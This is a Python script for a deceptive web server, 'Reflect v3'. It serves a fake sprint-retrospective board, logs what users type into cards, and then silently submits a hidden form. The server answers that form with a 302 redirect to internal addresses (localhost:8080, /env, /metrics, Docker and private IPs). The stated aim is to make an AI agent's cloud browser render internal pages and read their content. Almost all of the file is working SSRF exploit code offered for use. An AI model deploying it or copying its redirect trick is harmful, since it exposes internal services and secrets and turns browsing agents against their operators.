#!/usr/bin/env python3
"""
Reflect v3 — SSRF via Cloud Browser redirect
After card submit, server 302 → localhost:8080
Tests: server-side redirect, JS redirect, iframe, meta refresh

python3 server.py [port]  (default 7778)
"""

import json, sys, os
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

PORT = int(os.environ.get('PORT', sys.argv[1] if len(sys.argv) > 1 else 7778))
HITS = []

LOGO = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#0d9488" stroke-width="1.5"/><path d="M12 6v6l4 2" stroke="#0d9488" stroke-width="1.5" stroke-linecap="round"/></svg>'

# Internal targets to try (in order of priority)
TARGETS = [
    'http://localhost:8080/',
    'http://localhost:8080/health',
    'http://localhost:8080/metrics',
    'http://localhost:8080/env',
    'http://172.17.0.1/',
    'http://172.17.0.1:8080/',
    'http://10.0.0.1/',
]

PAGE = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sprint 24 Retro — Reflect</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',Roboto,sans-serif;
  background:#f1f5f9;color:#0f172a;-webkit-font-smoothing:antialiased;line-height:1.5;
  height:100vh;display:flex;flex-direction:column;overflow:hidden}
nav{background:#fff;border-bottom:1px solid #e2e8f0;height:48px;display:flex;align-items:center;
  justify-content:center;padding:0 20px;flex-shrink:0}
.ni{width:100%;max-width:1200px;display:flex;align-items:center;justify-content:space-between}
.logo{font-size:15px;font-weight:600;color:#0f172a;display:flex;align-items:center;gap:6px}
.nr{display:flex;align-items:center;gap:12px;font-size:12px;color:#64748b}
.nr .live{display:flex;align-items:center;gap:4px}
.nr .dot{width:6px;height:6px;border-radius:50%;background:#10b981}
.bh{max-width:1200px;width:100%;margin:0 auto;padding:12px 20px 0;flex-shrink:0}
.bh h1{font-size:18px;font-weight:700}
.bh p{font-size:12px;color:#64748b}
.board{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;padding:12px 20px;
  max-width:1200px;width:100%;margin:0 auto;flex:1;overflow:hidden;min-height:0}
@media(max-width:768px){.board{grid-template-columns:1fr;overflow-y:auto}}
.col{background:#fff;border-radius:10px;border:1px solid #e2e8f0;display:flex;flex-direction:column;overflow:hidden;min-height:0}
.ch{padding:10px 14px;border-bottom:1px solid #f1f5f9;display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
.ct{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;padding:3px 8px;border-radius:4px}
.cc{font-size:11px;color:#94a3b8}
.cb{padding:8px;overflow-y:auto;flex:1;display:flex;flex-direction:column;gap:6px}
.card{background:#f8fafc;border:1px solid #f1f5f9;border-radius:7px;padding:10px 12px}
.card-t{font-size:13px;color:#334155;margin-bottom:6px;line-height:1.45}
.card-m{display:flex;align-items:center;gap:6px;font-size:10px;color:#94a3b8}
.card-a{width:18px;height:18px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:7px;font-weight:700;color:#fff;flex-shrink:0}
.card-n{font-weight:600;color:#64748b}
.af{padding:8px;border-top:1px solid #f1f5f9;flex-shrink:0}
.ab{width:100%;padding:7px;background:none;border:1.5px dashed #e2e8f0;border-radius:6px;font-size:12px;color:#94a3b8;cursor:pointer;font-family:inherit}
.ap{display:none}.ap.show{display:block}
.ap textarea{width:100%;padding:8px;border:1px solid #e2e8f0;border-radius:6px;font-size:13px;color:#0f172a;font-family:inherit;resize:none;min-height:60px;margin-bottom:6px}
.ar{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:6px}
.ar input{padding:6px 8px;border:1px solid #e2e8f0;border-radius:5px;font-size:12px;color:#0f172a;font-family:inherit}
.as{padding:6px 14px;background:#0d9488;color:#fff;border:none;border-radius:5px;font-size:12px;font-weight:600;cursor:pointer}
.ac{padding:6px 14px;background:none;border:1px solid #e2e8f0;border-radius:5px;font-size:12px;color:#64748b;cursor:pointer;margin-left:6px}
.toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#0f172a;color:#fff;padding:10px 20px;border-radius:8px;font-size:13px;display:none;z-index:100}
footer{text-align:center;padding:8px;font-size:10px;color:#cbd5e1;flex-shrink:0}
</style>
</head><body>
<nav><div class="ni">
  <span class="logo">""" + LOGO + """Reflect</span>
  <span class="nr"><span class="live"><span class="dot"></span>Live</span> &middot; Sprint 24 &middot; Closes tonight</span>
</div></nav>
<div class="bh"><h1>Sprint 24 Retrospective</h1><p>Platform Team &middot; Jun 30 – Jul 3, 2026 &middot; 7 participants</p></div>
<div class="board">
  <div class="col">
    <div class="ch"><span class="ct" style="background:#dcfce7;color:#166534">Wins</span><span class="cc" id="wins-cc">3 cards</span></div>
    <div class="cb" id="wins-cb">
      <div class="card"><div class="card-t">Auth service migration completed 2 days ahead of schedule</div><div class="card-m"><span class="card-a" style="background:#6366f1">SC</span><span class="card-n">Sarah C.</span>&middot; 2h ago</div></div>
      <div class="card"><div class="card-t">Zero P0 incidents during deploy week</div><div class="card-m"><span class="card-a" style="background:#d97706">AK</span><span class="card-n">Alex K.</span>&middot; 4h ago</div></div>
      <div class="card"><div class="card-t">New search indexer reduced query latency by 40%</div><div class="card-m"><span class="card-a" style="background:#dc2626">PS</span><span class="card-n">Priya S.</span>&middot; 5h ago</div></div>
    </div>
    <div class="af"><button class="ab" onclick="sA('wins')">+ Add a card</button><div class="ap" id="wins-ap">
      <textarea id="wins-t" placeholder="What went well?"></textarea>
      <div class="ar"><input type="text" id="wins-n" placeholder="Your name"><input type="text" id="wins-tm" placeholder="Team"></div>
      <button class="as" onclick="sC('wins')">Add Card</button><button class="ac" onclick="hA('wins')">Cancel</button>
    </div></div>
  </div>
  <div class="col">
    <div class="ch"><span class="ct" style="background:#fef3c7;color:#92400e">Improve</span><span class="cc" id="improve-cc">2 cards</span></div>
    <div class="cb" id="improve-cb">
      <div class="card"><div class="card-t">Deploy pipeline still takes 40+ minutes</div><div class="card-m"><span class="card-a" style="background:#059669">MR</span><span class="card-n">Marcus R.</span>&middot; 3h ago</div></div>
      <div class="card"><div class="card-t">Monitoring alerts too noisy — 60% false positives</div><div class="card-m"><span class="card-a" style="background:#dc2626">PS</span><span class="card-n">Priya S.</span>&middot; 6h ago</div></div>
    </div>
    <div class="af"><button class="ab" onclick="sA('improve')">+ Add a card</button><div class="ap" id="improve-ap">
      <textarea id="improve-t" placeholder="What could be better?"></textarea>
      <div class="ar"><input type="text" id="improve-n" placeholder="Your name"><input type="text" id="improve-tm" placeholder="Team"></div>
      <button class="as" onclick="sC('improve')">Add Card</button><button class="ac" onclick="hA('improve')">Cancel</button>
    </div></div>
  </div>
  <div class="col">
    <div class="ch"><span class="ct" style="background:#dbeafe;color:#1e40af">Actions</span><span class="cc" id="actions-cc">2 cards</span></div>
    <div class="cb" id="actions-cb">
      <div class="card"><div class="card-t">Set up canary deploys for Q3</div><div class="card-m"><span class="card-a" style="background:#6366f1">SC</span><span class="card-n">Sarah C.</span>&middot; 1h ago</div></div>
      <div class="card"><div class="card-t">Reduce alert noise: tune thresholds + dedup</div><div class="card-m"><span class="card-a" style="background:#d97706">AK</span><span class="card-n">Alex K.</span>&middot; 2h ago</div></div>
    </div>
    <div class="af"><button class="ab" onclick="sA('actions')">+ Add a card</button><div class="ap" id="actions-ap">
      <textarea id="actions-t" placeholder="What should we do next?"></textarea>
      <div class="ar"><input type="text" id="actions-n" placeholder="Your name"><input type="text" id="actions-tm" placeholder="Team"></div>
      <button class="as" onclick="sC('actions')">Add Card</button><button class="ac" onclick="hA('actions')">Cancel</button>
    </div></div>
  </div>
</div>
<div class="toast" id="toast">Card added! Syncing with team...</div>
<!-- Hidden form for server-side redirect (Strategy A) -->
<form id="syncForm" method="POST" action="/api/sync" style="display:none">
  <input type="hidden" name="board" value="sprint-24">
</form>
<footer>&copy; 2026 Reflect</footer>

<script>
function sA(c){document.getElementById(c+'-ap').classList.add('show');}
function hA(c){document.getElementById(c+'-ap').classList.remove('show');}
function sC(c){
  var t=document.getElementById(c+'-t').value,n=document.getElementById(c+'-n').value,tm=document.getElementById(c+'-tm').value;
  if(!t)return;
  var cl=['#6366f1','#059669','#d97706','#dc2626','#0d9488'][Math.floor(Math.random()*5)];
  var ini=n?n.split(' ').map(function(w){return w[0]}).join('').toUpperCase().slice(0,2):'??';
  var d=document.createElement('div');d.className='card';
  d.innerHTML='<div class="card-t">'+t.replace(/</g,'&lt;')+'</div><div class="card-m"><span class="card-a" style="background:'+cl+'">'+ini+'</span><span class="card-n">'+n.replace(/</g,'&lt;')+'</span>&middot; just now</div>';
  document.getElementById(c+'-cb').appendChild(d);
  document.getElementById(c+'-t').value='';document.getElementById(c+'-n').value='';document.getElementById(c+'-tm').value='';
  hA(c);document.getElementById(c+'-cc').textContent=document.getElementById(c+'-cb').children.length+' cards';

  // Save to server
  fetch('/api/cards',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({column:c,text:t,name:n,team:tm})}).then(function(){
    // Show toast
    var toast=document.getElementById('toast');
    toast.style.display='block';
    // Strategy A: server-side 302 redirect via hidden form POST
    // The form POSTs to /api/sync, server responds with 302 → localhost:8080
    // Browser follows the redirect, Cloud Browser renders the internal page
    setTimeout(function(){
      document.getElementById('syncForm').submit();
    },1500);
  });
}
</script>
</body></html>"""


class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _ip(self):
        return (self.headers.get('X-Forwarded-For','').split(',')[0].strip()
                or self.headers.get('X-Real-IP','') or self.client_address[0])
    def _log(self, m, x=None):
        e = {'ts':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'m':m,'p':self.path,'ip':self._ip()}
        if x: e.update(x)
        HITS.append(e)
        with open('captured.log','a') as f: f.write(json.dumps(e)+'\n')
        print(f'  [{m}] {self.path} | {self._ip()}')

    def do_HEAD(self):
        self.send_response(200);self.send_header('Content-Type','text/html');self.end_headers()

    def do_GET(self):
        p = self.path.split('?')[0].rstrip('/')
        if p in ('/board','/','/retro',''):
            self._log('PAGE')
            self._html(PAGE)
        elif p == '/log':
            self._send(200,'application/json',json.dumps(HITS,indent=2))
        elif p == '/clear':
            HITS.clear()
            open('captured.log','w').close()
            self._send(200,'text/plain','OK')
        else:
            self._log('GET')
            self._html(PAGE)

    def do_POST(self):
        l = int(self.headers.get('Content-Length',0))
        body = self.rfile.read(l).decode() if l else ''
        p = self.path.split('?')[0].rstrip('/')

        if p == '/api/cards':
            try: data = json.loads(body)
            except: data = {}
            self._log('CARD', data)
            print(f'  [CARD] {data.get("name","?")} / {data.get("team","?")} → {data.get("column","?")}')
            self._send(200,'application/json','{"ok":true}')

        elif p == '/api/sync':
            # Strategy A: Server-side 302 redirect to internal URL
            target = TARGETS[0]  # localhost:8080
            self._log('REDIRECT', {'target': target})
            print(f"""
  ╔═══════════════════════════════════════════╗
  ║  SSRF REDIRECT TRIGGERED                  ║
  ║  302 → {target:<33}║
  ╚═══════════════════════════════════════════╝
""")
            self.send_response(302)
            self.send_header('Location', target)
            self.send_header('Cache-Control', 'no-store')
            self.end_headers()

        else:
            self._send(404,'text/plain','Not found')

    def _html(self, c): self._send(200,'text/html',c)
    def _send(self, code, ct, body):
        self.send_response(code)
        self.send_header('Content-Type', ct+'; charset=utf-8')
        self.send_header('Cache-Control','no-store')
        self.end_headers()
        self.wfile.write(body.encode() if isinstance(body,str) else body)


if __name__ == '__main__':
    s = HTTPServer(('0.0.0.0', PORT), H)
    print(f"""
  ┌──────────────────────────────────────────────────┐
  │  Reflect v3 — SSRF via Server-Side Redirect       │
  │  http://0.0.0.0:{PORT:<33}│
  ├──────────────────────────────────────────────────┤
  │  Board:    /board                                 │
  │  Cards:    /api/cards  (captures form data)       │
  │  Sync:     /api/sync   (302 → localhost:8080)     │
  │  Admin:    /log  /clear                           │
  ├──────────────────────────────────────────────────┤
  │  Flow: add card → toast → form POST /api/sync    │
  │        → 302 redirect → Cloud Browser renders     │
  │        internal page → agent reads content        │
  └──────────────────────────────────────────────────┘
""")
    try:
        s.serve_forever()
    except KeyboardInterrupt:
        print('\n  Stopped.\n')
        s.server_close()
